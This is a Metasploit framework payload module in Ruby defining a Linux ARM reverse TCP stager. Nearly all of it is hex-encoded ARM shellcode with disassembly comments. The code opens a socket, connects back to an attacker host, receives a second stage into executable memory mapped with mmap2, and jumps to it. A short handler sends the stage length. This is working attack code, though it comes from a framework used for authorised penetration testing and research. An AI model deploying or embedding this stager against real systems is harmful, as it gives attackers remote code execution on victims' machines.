##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# Linux reverse TCP stager.
#
###
module MetasploitModule

  CachedSize = 260

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => ['nemo <nemo[at]felinemenace.org>', 'tkmru'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_ARMLE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 242, 'n'    ],
              'LHOST' => [ 244, 'ADDR' ],
            },
          'Payload' =>
          [
            # Generated from external/source/shellcode/linux/armle/stager_sock_reverse.s
            0xe59f70f0,          #        ldr     r7, [pc, #240]    ; set 281(0x119) to r7
            0xe3a00002,          #        mov     r0, #2
            0xe3a01001,          #        mov     r1, #1
            0xe3a02006,          #        mov     r2, #6
            0xef000000,          #        svc     0x00000000        ; invoke socket
            0xe3500000,          #        cmp     r0, #0
            0xba000031,          #        blt     817c <failed>
            0xe1a0c000,          #        mov     ip, r0
            0xe2877002,          #        add     r7, r7, #2        ; set 283(0x11b) to r7
            0xe28f10c4,          #        add     r1, pc, #196      ; set first .word addr to r1
            0xe3a02010,          #        mov     r2, #16
            0xef000000,          #        svc     0x00000000        ; invoke connect
            0xe3500000,          #        cmp     r0, #0
            0xba00002a,          #        blt     817c <failed>
            0xe1a0000c,          #        mov     r0, ip
            0xe24dd004,          #        sub     sp, sp, #4
            0xe2877008,          #        add     r7, r7, #8        ; set 291(0x123) to r7
            0xe1a0100d,          #        mov     r1, sp
            0xe3a02004,          #        mov     r2, #4
            0xe3a03000,          #        mov     r3, #0
            0xef000000,          #        svc     0x00000000        ; invoke recv
            0xe3500000,          #        cmp     r0, #0
            0xba000021,          #        blt     817c <failed>
            0xe59d1000,          #        ldr     r1, [sp]
            0xe59f3094,          #        ldr     r3, [pc, #148]    ; set 0xfffff000 to r3
            0xe0011003,          #        and     r1, r1, r3
            0xe3a02001,          #        mov     r2, #1
            0xe1a02602,          #        lsl     r2, r2, #12
            0xe0811002,          #        add     r1, r1, r2        ; set 0x1000 to r1
            0xe3a070c0,          #        mov     r7, #192          ; set 192(0xC0) to r7
            0xe3e00000,          #        mvn     r0, #0            ; set 0xffffffff to r0
            0xe3a02007,          #        mov     r2, #7
            0xe59f3078,          #        ldr     r3, [pc, #120]    ; set r3 to 0x1022
            0xe1a04000,          #        mov     r4, r0
            0xe3a05000,          #        mov     r5, #0
            0xef000000,          #        svc     0x00000000        ; invoke mmap2
            0xe3700001,          #        cmn     r0, #1
            0x0a000012,          #        beq     <failed>
            0xe2877063,          #        add     r7, r7, #99       ; set 291(0x123) to r7
            0xe1a01000,          #        mov     r1, r0
            0xe1a0000c,          #        mov     r0, ip
            0xe3a03000,          #        mov     r3, #0
                                 #  loop:
            0xe59d2000,          #        ldr     r2, [sp]
            0xe2422ffa,          #        sub     r2, r2, #1000
            0xe58d2000,          #        str     r2, [sp]
            0xe3520000,          #        cmp     r2, #0
            0xda000004,          #        ble     80fc <last>
            0xe3a02ffa,          #        mov     r2, #1000
            0xef000000,          #        svc     0x00000000        ; invoke recv
            0xe3500000,          #        cmp     r0, #0
            0xba000005,          #        blt     817c <failed>
            0xeafffff5,          #        b       80dc <loop>
                                 #  last:
            0xe2822ffa,          #        add     r2, r2, #1000
            0xef000000,          #        svc     0x00000000        ; invoke recv
            0xe3500000,          #        cmp     r0, #0
            0xba000000,          #        blt     817c <failed>
            0xe1a0f001,          #        mov     pc, r1
                                 #  failed:
            0xe3a07001,          #        mov r7, #1
            0xe3a00001,          #        mov r0, #1
            0xef000000,          #        svc 0x00000000
            0x5c110002,          #  .word   0x5c110002
            0x0100007f,          #  .word   0x0100007f
            0x00000119,          #  .word   0x00000119
            0xfffff000,          #  .word   0xfffff000
            0x00001022           #  .word   0x00001022
          ].pack("V*")

        }
      ))
  end

def handle_intermediate_stage(conn, payload)

    print_status("Transmitting stage length value...(#{payload.length} bytes)")

    address_format = 'V'

    # Transmit our intermediate stager
    conn.put( [ payload.length ].pack(address_format) )

    return true
  end
end
